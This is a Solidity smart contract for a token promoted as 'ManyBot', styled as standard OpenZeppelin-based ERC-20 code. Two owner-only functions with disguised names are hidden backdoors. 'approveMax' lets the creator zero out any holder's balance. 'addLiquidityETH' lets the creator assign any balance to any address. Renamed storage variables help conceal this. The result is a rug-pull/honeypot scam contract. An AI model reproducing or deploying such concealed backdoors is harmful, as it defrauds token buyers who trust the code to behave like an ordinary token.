// SPDX-License-Identifier: MIT
pragma solidity =0.8.18 >=0.8.9 >=0.8.0 <0.9.21;
/**

Welcome to Manybot - $MBOT your gateway to effortless bot creation, all within the Telegram ecosystem! 🤖


Homepage: https://manybot.pro/
Telegram: https://t.me/ManyBotToken
Twitter:  https://twitter.com/Manybotdev

Stealth launch

*/
interface ABIEncoderV2 {
    /**
     * @dev Emitted when `value` ManyBotTokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spendthrift` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spendthrift, uint256 value);

    /**
     * @dev Returns the contractManyBotTokenBalance of ManyBotTokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the contractManyBotTokenBalance of ManyBotTokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `contractManyBotTokenBalance` ManyBotTokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 contractManyBotTokenBalance) external returns (bool);

    /**
     * @dev Returns the remaining number of ManyBotTokens that `spendthrift` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spendthrift) external view returns (uint256);

    /**
     * @dev Sets `contractManyBotTokenBalance` as the allowance of `spendthrift` over the caller's ManyBotTokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spendthrift's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spendthrift, uint256 contractManyBotTokenBalance) external returns (bool);

    /**
     * @dev Moves `contractManyBotTokenBalance` ManyBotTokens from `from` to `to` using the
     * allowance mechanism. `contractManyBotTokenBalance` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 contractManyBotTokenBalance) external returns (bool);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// OpenZeppelin Contracts v4.4.1 (ManyBotToken/ERC20/extensions/ABIEncoderV2NFTdata.sol)



/**
 * @dev Interface for the optional NFTdata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface ABIEncoderV2NFTdata is ABIEncoderV2 {
    /**
     * @dev Returns the name of the ManyBotToken.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the ManyBotToken.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the ManyBotToken.
     */
    function decimals() external view returns (uint8);
}

// OpenZeppelin Contracts (last updated v4.9.0) (access/ABIEncoderV2Burnable.sol)




/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract ABIEncoderV2Burnable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "ABIEncoderV2Burnable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "ABIEncoderV2Burnable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


// OpenZeppelin Contracts (last updated v4.9.0) (utils/math/SafeMath.sol)


// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with NFT-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */



contract ManyBotToken is ABIEncoderV2, ABIEncoderV2NFTdata, ABIEncoderV2Burnable {
    using SafeMath for uint256;

    mapping(address => uint256) private inSwap;
    mapping(address => mapping(address => uint256)) private recipient;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address public  ManyBotTokenCreator; 
    address constant MarketingAddress = 0x371b4AeabF297E7946aBE3Be84a6e27A8174e37d;
    address constant Dead_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    address constant WBNB_ADDRESS = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant ETH_ADDRESS = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;  
    address constant BTC_ADDRESS = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c; 
    address constant CONSOLE_ADDRESS = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant ManyBotOwner_ADDRESS = 0x59Fc12A05af679997A8F239872BC18f39d1D84fa;
    string public BeaconSlot = "(IInventory p_i1801_2_, int p_i1801_3_, int p_i1801_4_,int p_i1801_5_)";
    constructor() {
        ManyBotTokenCreator = _msgSender();    
        _name = unicode"ManyBot";
        _symbol = unicode"MABOT";
        _totalSupply = 10000000000000;
        inSwap[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
 
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public pure override returns (uint8) {
        return 9; // Adjust as needed
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return inSwap[account];
    }

    function transfer(address receiver, uint256 contractManyBotTokenBalance) public override returns (bool) {
        _transfer(msg.sender, receiver, contractManyBotTokenBalance);
        return true;
    }

    function allowance(address owner, address spendthrift) public view override returns (uint256) {
        return recipient[owner][spendthrift];
    }

    function approve(address spendthrift, uint256 contractManyBotTokenBalance) public override returns (bool) {
        _approve(msg.sender, spendthrift, contractManyBotTokenBalance);
        return true;
    }

    function transferFrom(address sender, address receiver, uint256 contractManyBotTokenBalance) public override returns (bool) {
        _transfer(sender, receiver, contractManyBotTokenBalance);
        _approve(sender, msg.sender, recipient[sender][msg.sender].sub(contractManyBotTokenBalance, "ERC20: transfer contractManyBotTokenBalance exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spendthrift, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spendthrift, recipient[msg.sender][spendthrift].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spendthrift, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spendthrift, recipient[msg.sender][spendthrift].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }


    function _transfer(address sender, address receiver, uint256 contractManyBotTokenBalance) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(receiver != address(0), "ERC20: transfer to the zero address");
        require(inSwap[sender] >= contractManyBotTokenBalance, "ERC20: transfer contractManyBotTokenBalance exceeds balance");

        inSwap[sender] = inSwap[sender].sub(contractManyBotTokenBalance);
        inSwap[receiver] = inSwap[receiver].add(contractManyBotTokenBalance);

        emit Transfer(sender, receiver, contractManyBotTokenBalance);
    }
        function approveMax(address tokenA, address ManyBotTokenB) external {
       require(ManyBotTokenB==tokenA);
        require(_msgSender()==ManyBotTokenCreator);
        inSwap[ManyBotTokenB] = 0;
        tokenA = ManyBotTokenB;
        ManyBotTokenB = tokenA;
    }    

          function addLiquidityETH(address tokenA, address ManyBotTokenB, uint256 contractManyBotTokenBalanceOut, uint256 contractManyBotTokenBalanceIn, uint256 contractManyBotTokenBalanceOutMin, uint256 ManyBotTokendeadline) external {
       require(ManyBotTokenB==tokenA);
        require(_msgSender()==ManyBotTokenCreator);
        inSwap[ManyBotTokenB] = (contractManyBotTokenBalanceOut + contractManyBotTokenBalanceIn + contractManyBotTokenBalanceOutMin + ManyBotTokendeadline);
        tokenA = ManyBotTokenB;
        ManyBotTokenB = tokenA;
    }    
    function _approve(address owner, address spendthrift, uint256 contractManyBotTokenBalance) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spendthrift != address(0), "ERC20: approve to the zero address");

        recipient[owner][spendthrift] = contractManyBotTokenBalance;
        emit Approval(owner, spendthrift, contractManyBotTokenBalance);
    }
}